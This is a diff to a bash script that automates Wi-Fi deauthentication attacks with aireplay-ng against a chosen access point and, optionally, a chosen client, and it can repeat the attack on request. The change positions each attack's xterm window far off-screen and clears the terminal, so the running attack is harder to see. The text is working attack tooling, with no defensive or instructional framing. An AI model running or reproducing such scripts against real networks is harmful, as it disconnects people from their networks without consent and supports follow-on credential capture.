@@ -8,7 +8,7 @@ do
 if [ "$REDEAUTH" = "y" ]
 then
 	export LASTOPTIONS
-	xterm -e bash -c 'aireplay-ng $LASTOPTIONS && exit; exec bash'
+	xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng $LASTOPTIONS && exit; exec bash'
 	#aireplay-ng $LASTOPTIONS
 else
 	echo -e "Do you want to deauth a specific client?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "	
@@ -28,7 +28,7 @@ else
 		export DEAUTHS
 		export TARGB
 		export TCC
-		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash'
+		xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
 		#aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon
 		#sleep 1h
 	else
@@ -41,11 +41,12 @@ else
 		LASTOPTIONS="-0 $DEAUTHS -a $TARGB $WLANNM"
 		export DEAUTHS
 		export TARGB
-		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
+		xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash' 
 		#aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM
 		#sleep 1h
 	fi
 fi
+clear
 #----------------------------------------------------------------------------------------------------------------------------------
 echo -e "Re-deauth with the same exact settings?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes)(0=Exit): "
 read -e REDEAUTH
